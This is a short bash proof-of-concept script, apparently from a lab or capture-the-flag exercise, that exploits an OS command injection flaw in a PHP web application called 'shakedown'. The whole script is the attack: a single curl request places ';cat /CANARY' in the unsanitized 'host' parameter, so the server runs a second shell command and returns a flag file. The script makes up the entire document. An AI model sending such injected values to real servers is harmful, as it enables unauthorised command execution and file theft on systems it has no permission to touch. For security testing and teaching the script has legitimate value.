#!/usr/bin/env bash
# PoC: OS command injection in shakedown target (PHP 8.3.35, Apache/2.4.68)
# Single command -> prints the target's /CANARY flag over HTTP.
set -euo pipefail

TARGET="${1:-http://127.0.0.1:8181/}"

# act=preview passes the unsanitized "host" GET parameter to a shell command.
# ";cat /CANARY" terminates the intended command and appends our own.
exec curl -sS -g "${TARGET}?act=preview&host=%3Bcat%20/CANARY"
